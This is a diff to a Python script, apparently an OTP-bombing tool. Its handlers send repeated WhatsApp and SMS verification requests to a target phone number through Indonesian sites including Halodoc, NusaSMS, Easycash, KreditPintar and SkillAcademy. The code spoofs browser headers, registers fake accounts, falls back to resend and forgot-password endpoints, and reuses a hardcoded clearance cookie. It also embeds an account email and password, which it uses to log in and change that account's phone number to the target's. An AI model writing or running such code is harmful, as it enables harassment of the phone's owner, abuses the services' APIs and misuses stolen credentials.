@@ -998,6 +998,8 @@ _BH_KONDISI  = ["SEDANG_HAMIL","MEMILIKI_BAYI"]
 def send_babyhappy_otp(phone_input):
     p = normalize(phone_input)
     phone_08 = p['fmt_08']
+    phone_8  = p['bare']   # 8xxxxxxxxx untuk resend
+    BASE_URL  = "https://club.babyhappydiapers.com"
     first = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,7))).capitalize()
     last  = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,7))).capitalize()
     payload = {
@@ -1016,10 +1018,10 @@ def send_babyhappy_otp(phone_input):
         "accept-encoding":    "gzip, deflate, br, zstd",
         "accept-language":    "id,en-US;q=0.9,en;q=0.8",
         "content-type":       "application/json",
-        "origin":             "https://club.babyhappydiapers.com",
+        "origin":             BASE_URL,
         "priority":           "u=1, i",
-        "referer":            "https://club.babyhappydiapers.com/registration/form",
-        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
+        "referer":            f"{BASE_URL}/registration/form",
+        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
         "sec-ch-ua-mobile":   "?0",
         "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest":     "empty",
@@ -1028,10 +1030,20 @@ def send_babyhappy_otp(phone_input):
         "user-agent":         get_random_user_agent(),
     }
     try:
-        resp = requests.post("https://club.babyhappydiapers.com/api/registration/new", headers=headers, json=payload, timeout=15, verify=False)
+        resp = requests.post(f"{BASE_URL}/api/registration/new",
+                             headers=headers, json=payload, timeout=15, verify=False)
+        if resp.status_code == 200:
+            return resp.status_code, resp.text
+        # 409 = sudah terdaftar → resend
+        if resp.status_code == 409:
+            hdrs2 = {**headers, "referer": f"{BASE_URL}/registration"}
+            r2 = requests.post(f"{BASE_URL}/api/registration/resend-otp-phone",
+                               headers=hdrs2, json={"phone": phone_8}, timeout=15, verify=False)
+            return r2.status_code, r2.text
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
+
 
 # ==================== HANDLER 32: BUKUAKU ====================
 _BA_CF = "CrztkFewy94bJ_Bl5hP7E5JmEfSAxaenr6gYaeTTYqY7s2P0tymlC34RKGw_Ynk-E6q6pm1qb9XMsfE7MmUXbaeArgeBask2X5ihNbOccQh_gl0eKl1Pq1MZ3edZ78cQWXlUPDTBBGF7IiQyUC5GiUTCQZJzM_b2XZjSmLeZlnrgq6J_8LJHsp9zqlGUbmzOuYWlmvfOI8hEuFKuP7wZ2-fPWHzrUw_x_hfQaY4BhQnItFm5Rc2GHM20aHD1T8Cyu_6hmnx6hS6fYufZQWhADohg4AgveIv1HqUOcrv9tiHC-IyLKhjgNzNMeDem9rYk8wvnr0ST_OEbxpa37lL13rGOnycEF1Oea2SQMtY9egSMUKCPZj020DZ6OY_0V17jVED0GORVJV6_ACQ95htPrrsghjp0vIb096PtkpaiJ0-8R8DdOBdLyOn78voAe_4YJ4RS_qWYgA"
@@ -1040,10 +1052,32 @@ _BA_CITIES    = {2: [26, 27, 28], 3: [30, 31], 5: [50, 51], 6: [60, 61], 7: [70]
 
 def send_bukuaku_otp(phone_input):
     p = normalize(phone_input)
-    phone_08 = p['fmt_08']
+    phone_08    = p['fmt_08']
+    BASE_URL    = "https://bukuaku.id"
     province_id = random.choice(_BA_PROVINCES)
     city_id     = random.choice(_BA_CITIES[province_id])
     password    = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+    cookie_str  = f"auth.strategy=local; auth._token.local=false; auth._refresh_token.local=false; cf_clearance={_BA_CF}"
+
+    def _headers(referer):
+        return {
+            "accept":             "application/json, text/plain, */*",
+            "accept-encoding":    "gzip, deflate, br, zstd",
+            "accept-language":    "id,en-US;q=0.9,en;q=0.8",
+            "content-type":       "application/json",
+            "cookie":             cookie_str,
+            "origin":             BASE_URL,
+            "priority":           "u=1, i",
+            "referer":            referer,
+            "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
+            "sec-ch-ua-mobile":   "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest":     "empty",
+            "sec-fetch-mode":     "cors",
+            "sec-fetch-site":     "same-origin",
+            "user-agent":         get_random_user_agent(),
+        }
+
     payload = {
         "name":                  "dwasdwasd",
         "birth_year":            str(random.randint(1985, 2000)),
@@ -1056,28 +1090,21 @@ def send_bukuaku_otp(phone_input):
         "city_id":               city_id,
         "otp_type":              "WA",
     }
-    headers = {
-        "accept":             "application/json, text/plain, */*",
-        "accept-encoding":    "gzip, deflate, br, zstd",
-        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
-        "content-type":       "application/json",
-        "cookie":             f"auth.strategy=local; cf_clearance={_BA_CF}",
-        "origin":             "https://bukuaku.id",
-        "priority":           "u=1, i",
-        "referer":            "https://bukuaku.id/id/register",
-        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile":   "?0",
-        "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest":     "empty",
-        "sec-fetch-mode":     "cors",
-        "sec-fetch-site":     "same-origin",
-        "user-agent":         get_random_user_agent(),
-    }
     try:
-        resp = requests.post("https://bukuaku.id/base/register", headers=headers, json=payload, timeout=15, verify=False)
-        return resp.status_code, resp.text
+        resp = requests.post(f"{BASE_URL}/base/register",
+                             headers=_headers(f"{BASE_URL}/id/register"),
+                             json=payload, timeout=15, verify=False)
+        if resp.status_code in (200, 201):
+            return resp.status_code, resp.text
+        # gagal register → forgot_password fallback
+        r2 = requests.post(f"{BASE_URL}/base/forgot_password",
+                           headers=_headers(f"{BASE_URL}/id/login/forgot-password"),
+                           json={"otp_type": "WA", "phone": phone_08},
+                           timeout=15, verify=False)
+        return r2.status_code, r2.text
     except Exception as e:
         return None, str(e)
+
 
 # ==================== HANDLER 33: GENERASI MAJU ====================
 _GM_CSRF     = "c2e362dee8d77f250685126b8707e2ecbff4af1a"
@@ -1733,31 +1760,78 @@ def send_kpoin_otp(phone_input):
 
 # ==================== HANDLER 53: NUSASMS ====================
 def send_nusasms_otp(phone_input):
+    # Flow: seed → verify (get signupToken) → sendotp (form-encoded)
     p = normalize(phone_input)
+    phone_08 = p['fmt_08']
     phone_62 = p['fmt_62']
-    name  = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
-    email = name.lower() + str(random.randint(100, 999)) + "@gmail.com"
-    headers = {
-        "accept": "application/json, text/plain, */*",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "content-type": "application/json",
-        "origin": "https://app.nusasms.com",
-        "referer": "https://app.nusasms.com/",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
-        "user-agent": get_random_user_agent(),
+
+    def _rng_str(n):
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
+    def _rng_pass():
+        return (
+            random.choice(string.ascii_uppercase)
+            + random.choice(string.ascii_lowercase)
+            + random.choice(string.digits)
+            + random.choice("!@#$%^&*")
+            + _rng_str(6)
+        )
+
+    user_id  = _rng_str(12)
+    password = _rng_pass()
+    email    = _rng_str(8) + "@gmail.com"
+
+    sess = requests.Session()
+    try:
+        sess.get("https://app.nusasms.com/freetrial",
+                 headers={"User-Agent": get_random_user_agent()},
+                 timeout=10, verify=False)
+    except Exception:
+        pass
+
+    base_hdrs = {
+        "Host":               "app.nusasms.com",
+        "Connection":         "keep-alive",
+        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
+        "sec-ch-ua-mobile":   "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "User-Agent":         get_random_user_agent(),
+        "Accept":             "application/json, text/javascript, */*; q=0.01",
+        "Content-Type":       "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With":   "XMLHttpRequest",
+        "Origin":             "https://app.nusasms.com",
+        "Sec-Fetch-Site":     "same-origin",
+        "Sec-Fetch-Mode":     "cors",
+        "Sec-Fetch-Dest":     "empty",
+        "Referer":            "https://app.nusasms.com/freetrial",
+        "Accept-Encoding":    "gzip, deflate, br, zstd",
+        "Accept-Language":    "id,en-US;q=0.9,en;q=0.8",
     }
-    payload = {
-        "name": name, "email": email, "phone": phone_62,
-        "password": "Pass@" + ''.join(random.choices(string.digits, k=4)),
-        "password_confirmation": "Pass@" + ''.join(random.choices(string.digits, k=4)),
-        "otp_via": "whatsapp",
+
+    # Step 1: verify → dapat signupToken
+    verify_form = {
+        "userId":      user_id,
+        "password":    password,
+        "rePassword":  password,
+        "email":       email,
+        "serviceType": "masking",
+        "phoneNumber": phone_08,
     }
     try:
-        resp = requests.post("https://app.nusasms.com/processSignup",
-                             headers=headers, json=payload, timeout=15, verify=False)
+        r = sess.post("https://app.nusasms.com/processSignup?action=verify",
+                      headers=base_hdrs, data=verify_form, timeout=15, verify=False)
+        verify_resp = r.json() if r.text else {}
+    except Exception as e:
+        return None, str(e)
+
+    if "signupToken" not in verify_resp:
+        return r.status_code if r else None, str(verify_resp)
+
+    # Step 2: sendotp — kirim verify response + otpType
+    otp_form = {**verify_resp, "otpType": "wa"}
+    try:
+        resp = sess.post("https://app.nusasms.com/processSignup?action=sendotp",
+                         headers=base_hdrs, data=otp_form, timeout=15, verify=False)
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -2148,25 +2222,78 @@ def send_bpjs_otp(phone_input):
 
 # ==================== HANDLER 68: HALODOC ====================
 def send_halodoc_otp(phone_input):
+    # Flow: configs → challenge → validate → GET otp (rotate XSRF) → POST otp
+    import os as _os, uuid as _uuid
     p = normalize(phone_input)
     phone_plus = p['fmt_plus']
-    headers = {
-        "accept": "application/json",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "content-type": "application/json",
-        "origin": "https://www.halodoc.com",
-        "referer": "https://www.halodoc.com/login",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
-        "user-agent": get_random_user_agent(),
-    }
-    payload = {"phone_number": phone_plus}
+    BASE_URL     = "https://www.halodoc.com"
+    CLIENT_TOKEN = "5aef147b2eb6d7b2a8057752cd05f5a511c65a63039b8708c28241e11779af0e"
+    CLIENT_ID    = "aeb680fb9b7907ec7f7caa60eb2bde3d"
+    DEVICE_ID    = str(_uuid.uuid4())
+    UA           = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
+
+    sess = requests.Session()
+
+    def _gen_tp():
+        return f"00-{_os.urandom(16).hex()}-{_os.urandom(8).hex()}-01"
+
+    def _get_xsrf():
+        return requests.utils.unquote(sess.cookies.get("XSRF-TOKEN", ""))
+
+    def _base_h(xsrf=""):
+        h = {
+            "accept":             "application/json, text/plain, */*",
+            "accept-encoding":    "gzip, deflate, br, zstd",
+            "accept-language":    "id,en-US;q=0.9,en;q=0.8",
+            "priority":           "u=1, i",
+            "referer":            f"{BASE_URL}/",
+            "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
+            "sec-ch-ua-mobile":   "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest":     "empty",
+            "sec-fetch-mode":     "cors",
+            "sec-fetch-site":     "same-origin",
+            "traceparent":        _gen_tp(),
+            "user-agent":         UA,
+        }
+        if xsrf:
+            h["x-xsrf-token"] = xsrf
+        return h
+
     try:
-        resp = requests.post(
-            "https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests",
-            headers=headers, json=payload, timeout=15, verify=False)
+        # Step 1: configs → seed XSRF
+        sess.get(f"{BASE_URL}/magneto-api/v1/auth/configs",
+                 headers=_base_h(), timeout=12, verify=False)
+        xsrf = _get_xsrf()
+
+        # Step 2: challenge
+        sess.put(f"{BASE_URL}/magneto-api/v1/users/passkey/authenticate/challenge",
+                 headers={**_base_h(xsrf), "content-type": "application/json"},
+                 json={"device_id": DEVICE_ID}, timeout=12, verify=False)
+        xsrf = _get_xsrf()
+
+        # Step 3: validate
+        sess.get(f"{BASE_URL}/magneto-api/v1/users/passkey/{phone_plus}/validate",
+                 headers=_base_h(xsrf), timeout=12, verify=False)
+        xsrf = _get_xsrf()
+
+        # Step 4: GET otp → rotate XSRF via response header
+        r = sess.get(f"{BASE_URL}/magneto-api/v2/users/authentication/otp/requests",
+                     headers=_base_h(xsrf),
+                     params={"clientToken": CLIENT_TOKEN},
+                     timeout=12, verify=False)
+        xsrf_new = (r.headers.get("X-Xsrf-Token") or
+                    r.headers.get("x-xsrf-token") or
+                    _get_xsrf())
+
+        # Step 5: POST otp
+        resp = sess.post(
+            f"{BASE_URL}/magneto-api/v2/users/authentication/otp/requests",
+            headers={**_base_h(xsrf_new), "content-type": "application/json"},
+            json={"phone_number": phone_plus, "channel": "whatsapp",
+                  "otp_resent": False, "clientId": CLIENT_ID},
+            timeout=15, verify=False,
+        )
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -2229,6 +2356,227 @@ def send_rumah123_otp(phone_input):
     try:
         resp = sess.post(f"{BASE_URL}/api/otp/request-otp",
                          headers=headers, json=payload, timeout=15, verify=False)
+        return resp.status_code, resp.text
+    except Exception as e:
+        return None, str(e)
+# ==================== HANDLER 71: EASYCASH ====================
+def send_easycash_otp(phone_input):
+    import time as _time
+    p = normalize(phone_input)
+    phone_08 = p['fmt_08']
+    BASE_URL = "https://loan.easycash.id"
+    FALLBACK_TOKEN = "webFakeToken-536b8339161c4ad195b169bf71c2efb5"
+    sess = requests.Session()
+    device_token = FALLBACK_TOKEN
+    try:
+        r0 = sess.get(
+            f"{BASE_URL}/register-login",
+            headers={"User-Agent": get_random_user_agent()},
+            timeout=10, verify=False,
+        )
+        token = sess.cookies.get("deviceToken", "")
+        if token:
+            device_token = token
+    except Exception:
+        pass
+
+    static_cookies = {
+        "sajssdk_2015_cross_new_user": "1",
+        "_fbp":            "fb.1.1726404364208.304406689168566354",
+        "_tt_enable_cookie": "1",
+        "_ttp":            "jyUZUOglVrrmkdG37oUf2jq1eVS",
+        "_ga":             "GA1.1.512112514.1726404367",
+        "_gcl_au":         "1.1.552118675.1726404367",
+        "_ttd_sync":       "1",
+    }
+    merged = {**static_cookies, **dict(sess.cookies)}
+    merged["deviceToken"] = device_token
+    cookie_str = "; ".join(f"{k}={v}" for k, v in merged.items())
+
+    headers = {
+        "Host":                        "loan.easycash.id",
+        "platformtype":                "WEB",
+        "User-Agent":                  get_random_user_agent(),
+        "yqg-platform-device-token":   device_token,
+        "Accept":                      "application/json, text/plain, */*",
+        "build":                       "35313",
+        "yqg-platform-sdk-type":       "IDN_YQD",
+        "yqg-platform-language":       "id",
+        "Content-Type":                "application/json",
+        "blackbox":                    "oWPIc1726404367ES4sE5ow0G2",
+        "Origin":                      BASE_URL,
+        "Sec-Fetch-Site":              "same-origin",
+        "Sec-Fetch-Mode":              "cors",
+        "Sec-Fetch-Dest":              "empty",
+        "Referer":                     f"{BASE_URL}/register-login",
+        "Accept-Encoding":             "gzip, deflate, br, zstd",
+        "Accept-Language":             "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Cookie":                      cookie_str,
+    }
+    payload = {
+        "mobileNumber":        phone_08,
+        "notifType":           "WHATSAPP",
+        "verificationPurpose": "REGISTER_OR_LOGIN",
+    }
+    try:
+        resp = sess.post(
+            f"{BASE_URL}/api/mobile/sendVerificationWithoutCaptcha",
+            headers=headers, json=payload, timeout=15, verify=False,
+        )
+        return resp.status_code, resp.text
+    except Exception as e:
+        return None, str(e)
+
+
+# ==================== HANDLER 72: KREDITPINTAR ====================
+def send_kreditpintar_otp(phone_input):
+    p = normalize(phone_input)
+    phone_08 = p['fmt_08']
+    BASE_URL = "https://go.kreditpintar.com"
+    sess = requests.Session()
+    try:
+        sess.get(
+            f"{BASE_URL}/daftar",
+            headers={"User-Agent": get_random_user_agent()},
+            timeout=10, verify=False,
+        )
+    except Exception:
+        pass
+    headers = {
+        "Host":              "go.kreditpintar.com",
+        "Connection":        "keep-alive",
+        "sec-ch-ua-platform": '"Android"',
+        "User-Agent":        get_random_user_agent(),
+        "Accept":            "application/json, text/plain, */*",
+        "sec-ch-ua":         '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+        "Content-Type":      "application/json",
+        "sec-ch-ua-mobile":  "?1",
+        "Origin":            BASE_URL,
+        "Sec-Fetch-Site":    "same-origin",
+        "Sec-Fetch-Mode":    "cors",
+        "Sec-Fetch-Dest":    "empty",
+        "Referer":           f"{BASE_URL}/daftar",
+        "Accept-Encoding":   "gzip, deflate, br, zstd",
+        "Accept-Language":   "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+    }
+    payload = {"mobileNumber": phone_08}
+    try:
+        resp = sess.post(
+            f"{BASE_URL}/api/auth/send-code",
+            headers=headers, json=payload, timeout=15, verify=False,
+        )
+        return resp.status_code, resp.text
+    except Exception as e:
+        return None, str(e)
+
+
+# ==================== HANDLER 73: SKILLACADEMY ====================
+import base64 as _b64
+import json as _json_sa
+
+_SA_EMAIL  = "azbantara@gmail.com"
+_SA_PASSWD = "4i_juLyPPgQ2396"
+_SA_GW     = "https://gw.ruangguru.com"
+_SA_ORIGIN = "https://skillacademy.com"
+_SA_UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"
+
+def _sa_hdrs_gw(token="", with_auth="true"):
+    h = {
+        "accept":             "application/json",
+        "accept-encoding":    "gzip, deflate, br, zstd",
+        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
+        "content-type":       "application/json",
+        "country":            "id",
+        "disable-node-proxy": "true",
+        "origin":             _SA_ORIGIN,
+        "referer":            "https://skillacademy.com/",
+        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
+        "sec-ch-ua-mobile":   "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest":     "empty",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-site":     "cross-site",
+        "tenantname":         "skillacademy",
+        "user-agent":         _SA_UA,
+        "with-auth":          with_auth,
+    }
+    if token:
+        h["authorization"] = f"Bearer {token}" if not token.startswith("eyJ") else token
+    return h
+
+def _sa_hdrs_sa():
+    return {
+        "accept":             "application/json",
+        "accept-encoding":    "gzip, deflate, br, zstd",
+        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
+        "connection":         "keep-alive",
+        "content-type":       "application/json",
+        "country":            "id",
+        "disable-node-proxy": "false",
+        "host":               "skillacademy.com",
+        "origin":             _SA_ORIGIN,
+        "referer":            "https://skillacademy.com/auth/login?redirectTo=/",
+        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
+        "sec-ch-ua-mobile":   "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest":     "empty",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-site":     "same-origin",
+        "tenantname":         "skillacademy",
+        "user-agent":         _SA_UA,
+        "with-auth":          "false",
+    }
+
+def send_skillacademy_otp(phone_input):
+    p = normalize(phone_input)
+    target = p['bare']  # 8xxxxxxxxx
+    sess = requests.Session()
+
+    # Step 1: login
+    token = ""
+    try:
+        r = sess.post(
+            "https://skillacademy.com/api/auth/custom-login",
+            headers=_sa_hdrs_sa(),
+            json={"username": _SA_EMAIL, "password": _SA_PASSWD, "type": "default"},
+            timeout=15, verify=False,
+        )
+        if r.status_code == 200:
+            data = r.json() if r.text else {}
+            inner = data.get("data", {})
+            if isinstance(inner, list): inner = inner[0] if inner else {}
+            if isinstance(inner, dict):
+                lr = inner.get("login_response") or {}
+                token = (lr.get("accessToken") or lr.get("token") or
+                         inner.get("accessToken") or inner.get("token") or "")
+            if not token:
+                token = r.headers.get("authorization", "").replace("Bearer ", "")
+    except Exception:
+        pass
+
+    if not token:
+        return None, "login failed"
+
+    # Step 2: update phone ke target
+    for method, url in [
+        ("PUT",   f"{_SA_GW}/skillacademy/user"),
+        ("PATCH", f"{_SA_GW}/skillacademy/user"),
+    ]:
+        for payload in [{"phoneNumber": target}, {"phone": target}, {"phone_number": target}]:
+            try:
+                fn = sess.put if method == "PUT" else sess.patch
+                fn(url, headers=_sa_hdrs_gw(token=token), json=payload, timeout=10, verify=False)
+            except Exception:
+                pass
+
+    # Step 3: send OTP
+    try:
+        resp = sess.post(
+            f"{_SA_GW}/skillacademy/user/phone-number/send-otp",
+            headers=_sa_hdrs_gw(token=token),
+            json={"type": "OTPTypeWhatsApp"},
+            timeout=15, verify=False,
+        )
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
